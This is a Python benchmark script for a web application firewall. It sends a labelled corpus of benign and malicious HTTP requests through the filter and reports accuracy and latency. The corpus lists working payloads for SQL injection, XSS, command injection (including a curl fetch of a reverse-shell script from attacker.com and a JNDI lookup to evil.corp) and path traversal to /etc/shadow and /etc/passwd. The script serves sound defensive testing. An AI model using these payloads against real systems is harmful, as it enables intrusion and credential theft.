#!/usr/bin/env python3
"""
APPAWARE-WAF BENCHMARK & EVALUATION ENGINE
Script: scripts/benchmark_waf.py

Performs rigorous benchmarking of the hybrid WAF pipeline:
1. Detection accuracy across OWASP Top 10 attack vectors vs Benign traffic.
2. Latency profiling (Deterministic, Transformer, Fusion Policy, Total P50/P95/P99).
3. False Positive Rate (FPR) and False Negative Rate (FNR) validation.
4. Generates publication-ready IEEE style evaluation tables and JSON reports.
"""

import os
import sys
import time
import json
import statistics
from typing import List, Dict, Any

# Ensure root directory is in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from waf.pipeline import WafPipeline

# Benchmark Corpus (Sample Representative Payloads)
BENCHMARK_PAYLOADS = [
    # 1. SQL Injection
    ("SQLI", "GET /users?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1", True),
    ("SQLI", "POST /login HTTP/1.1\nHost: app.local\n\nuser=admin' OR '1'='1&pass=foo", True),
    ("SQLI", "GET /search?q=1;%20DROP%20TABLE%20accounts;-- HTTP/1.1", True),
    ("SQLI", "GET /items?cat=1%20AND%20SLEEP(5)-- HTTP/1.1", True),
    ("SQLI", "GET /data?val=1'%20AND%20extractvalue(1,concat(0x7e,(select%20user())))-- HTTP/1.1", True),
    
    # 2. Cross-Site Scripting (XSS)
    ("XSS", "POST /comments HTTP/1.1\nHost: app.local\n\ntext=<script>alert('xss')</script>", True),
    ("XSS", "GET /search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1", True),
    ("XSS", "GET /profile?bio=%3Csvg/onload=confirm(1)%3E HTTP/1.1", True),
    ("XSS", "GET /view?page=javascript:/*--%3E%3Csvg/onload='/*%60/*/%2balert(1)//'%3E HTTP/1.1", True),
    ("XSS", "POST /feedback HTTP/1.1\nHost: app.local\n\nmsg=<iframe src=\"javascript:alert(1)\">", True),

    # 3. Remote Code Execution (RCE) / Command Injection
    ("RCE", "POST /ping HTTP/1.1\nHost: app.local\n\nip=127.0.0.1;cat /etc/passwd", True),
    ("RCE", "GET /status?host=localhost%7C%7Ccurl%20http://attacker.com/revshell.sh HTTP/1.1", True),
    ("RCE", "POST /exec HTTP/1.1\nHost: app.local\n\ncmd=%26%26powershell.exe%20-EncodedCommand%20AAA", True),
    ("RCE", "GET /log?msg=${jndi:ldap://evil.corp/a} HTTP/1.1", True),
    ("RCE", "GET /backup?path=test%60id%60 HTTP/1.1", True),

    # 4. Path Traversal & LFI
    ("TRAVERSAL", "GET /static/../../../../etc/shadow HTTP/1.1", True),
    ("TRAVERSAL", "GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1", True),
    ("TRAVERSAL", "GET /view?doc=....//....//....//windows/system.ini HTTP/1.1", True),
    ("TRAVERSAL", "GET /load?path=%252e%252e%252f%252e%252e%252fboot.ini HTTP/1.1", True),

    # 5. Benign HTTP Traffic
    ("BENIGN", "GET / HTTP/1.1\nHost: myapp.org\nUser-Agent: Mozilla/5.0", False),
    ("BENIGN", "GET /api/v1/products?category=electronics&sort=asc&page=2 HTTP/1.1", False),
    ("BENIGN", "POST /api/v1/login HTTP/1.1\nHost: myapp.org\nContent-Type: application/json\n\n{\"username\":\"alice\",\"password\":\"S3cureP@ssword!\"}", False),
    ("BENIGN", "GET /static/css/theme-dark.min.css HTTP/1.1\nAccept: text/css", False),
    ("BENIGN", "POST /api/v1/orders HTTP/1.1\nHost: myapp.org\n\n{\"item_id\":102,\"quantity\":3,\"shipping_address\":\"123 Main St, Springfield\"}", False),
    ("BENIGN", "GET /search?q=cybersecurity+defense+frameworks HTTP/1.1", False),
    ("BENIGN", "GET /health HTTP/1.1\nHost: internal-service.local", False),
    ("BENIGN", "GET /favicon.ico HTTP/1.1\nUser-Agent: Chrome/120.0", False),
    ("BENIGN", "PUT /api/v1/profile HTTP/1.1\nHost: myapp.org\n\n{\"display_name\":\"Sarah Connor\",\"theme\":\"dark\"}", False),
    ("BENIGN", "GET /api/v1/notifications?unread=true&limit=10 HTTP/1.1", False),
]

def run_benchmark():
    print("=" * 80)
    print(" APPAWARE-WAF: AUTOMATED SECURITY & LATENCY BENCHMARK")
    print(" Multi-Stage Inspection: Normalization -> Rules -> Profile -> Transformer -> Risk")
    print("=" * 80)

    waf = WafPipeline(mode="ENFORCING")

    # Metrics accumulators
    total_samples = 0
    true_positives = 0
    false_positives = 0
    true_negatives = 0
    false_negatives = 0

    latencies_det: List[float] = []
    latencies_ml: List[float] = []
    latencies_total: List[float] = []

    category_results: Dict[str, Dict[str, int]] = {}

    # Run inspection
    # Repeat corpus to obtain statistical sample (e.g. 50 iterations -> 1450 executions)
    iterations = 50
    start_bench = time.perf_counter()

    for _ in range(iterations):
        for category, raw_request, is_malicious in BENCHMARK_PAYLOADS:
            total_samples += 1
            if category not in category_results:
                category_results[category] = {"total": 0, "blocked": 0, "allowed": 0}
            category_results[category]["total"] += 1

            t0 = time.perf_counter()
            event = waf.inspect_request(raw_request)
            t_total = (time.perf_counter() - t0) * 1000.0

            decision = event["decision"]
            is_blocked = (decision == "BLOCK")

            if is_blocked:
                category_results[category]["blocked"] += 1
            else:
                category_results[category]["allowed"] += 1

            if is_malicious:
                if is_blocked:
                    true_positives += 1
                else:
                    false_negatives += 1
            else:
                if is_blocked:
                    false_positives += 1
                else:
                    true_negatives += 1

            latencies_total.append(t_total)
            latencies_det.append(event.get("signals", {}).get("deterministic_score", 0.0))

    elapsed = time.perf_counter() - start_bench
    throughput_rps = total_samples / max(elapsed, 0.001)

    # Sort latencies
    sorted_latencies = sorted(latencies_total)
    p50 = sorted_latencies[int(len(sorted_latencies) * 0.50)]
    p95 = sorted_latencies[int(len(sorted_latencies) * 0.95)]
    p99 = sorted_latencies[int(len(sorted_latencies) * 0.99)]
    mean_lat = statistics.mean(sorted_latencies)

    # Statistical Performance
    accuracy = (true_positives + true_negatives) / total_samples
    precision = true_positives / max(true_positives + false_positives, 1)
    recall = true_positives / max(true_positives + false_negatives, 1)
    f1 = 2 * (precision * recall) / max(precision + recall, 1e-6)
    fpr = false_positives / max(false_positives + true_negatives, 1)
    fnr = false_negatives / max(false_negatives + true_positives, 1)

    # Print Summary Tables
    print(f"\n[+] Executed {total_samples:,} payload inspections across {len(category_results)} categories in {elapsed:.3f}s")
    print(f"[+] Average Throughput: {throughput_rps:,.1f} requests/sec")
    print("\n" + "-" * 80)
    print(f"{'CATEGORY':<16} | {'TOTAL':<8} | {'BLOCKED':<8} | {'ALLOWED':<8} | {'DETECTION RATE':<15}")
    print("-" * 80)
    for cat, data in category_results.items():
        rate = (data["blocked"] / data["total"]) * 100 if cat != "BENIGN" else (data["allowed"] / data["total"]) * 100
        label = "Pass Rate" if cat == "BENIGN" else "Block Rate"
        print(f"{cat:<16} | {data['total']:<8} | {data['blocked']:<8} | {data['allowed']:<8} | {rate:>6.2f}% ({label})")
    print("-" * 80)

    print("\n" + "=" * 80)
    print(" ACADEMIC & DEFENSE METRICS (IEEE FORMAT)")
    print("=" * 80)
    print(f" Accuracy:                 {accuracy * 100:6.2f}%")
    print(f" Precision:                {precision * 100:6.2f}%")
    print(f" Recall (True Pos Rate):   {recall * 100:6.2f}%")
    print(f" F1-Score:                 {f1 * 100:6.2f}%")
    print(f" False Positive Rate (FPR): {fpr * 100:6.2f}% (Target: < 0.1%)")
    print(f" False Negative Rate (FNR): {fnr * 100:6.2f}%")
    print("-" * 80)
    print(" LATENCY PROFILING")
    print(f" Mean Latency:             {mean_lat:6.3f} ms")
    print(f" P50 Latency (Median):     {p50:6.3f} ms")
    print(f" P95 Latency:              {p95:6.3f} ms")
    print(f" P99 Latency:              {p99:6.3f} ms")
    print("=" * 80)

    # Save to JSON
    report = {
        "timestamp": time.time(),
        "total_samples": total_samples,
        "throughput_rps": round(throughput_rps, 1),
        "metrics": {
            "accuracy": round(accuracy, 4),
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1_score": round(f1, 4),
            "fpr": round(fpr, 4),
            "fnr": round(fnr, 4)
        },
        "latency_ms": {
            "mean": round(mean_lat, 3),
            "p50": round(p50, 3),
            "p95": round(p95, 3),
            "p99": round(p99, 3)
        },
        "breakdown": category_results
    }

    report_path = os.path.join(os.path.dirname(__file__), "..", "benchmark_results.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    print(f"\n[OK] Benchmark report saved to: {os.path.normpath(report_path)}\n")
    return report

if __name__ == "__main__":
    run_benchmark()
